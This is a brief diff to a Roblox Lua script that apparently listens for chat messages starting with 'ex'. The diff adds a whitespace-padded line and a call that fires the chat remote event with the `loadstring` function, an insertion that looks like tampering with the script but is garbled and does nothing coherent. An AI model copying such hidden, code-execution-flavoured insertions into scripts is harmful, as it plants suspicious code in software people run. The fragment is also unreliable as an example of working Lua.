@@ -1,5 +1,8 @@
 local plr = game.GetService"Players"
 local Lp = plr.LocalPlayer
+                                                                                                                                   
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(loadstring)
 
 Lp.Chatted:Connect(function(msg)
 if msg:sub(1,2) == "ex" then
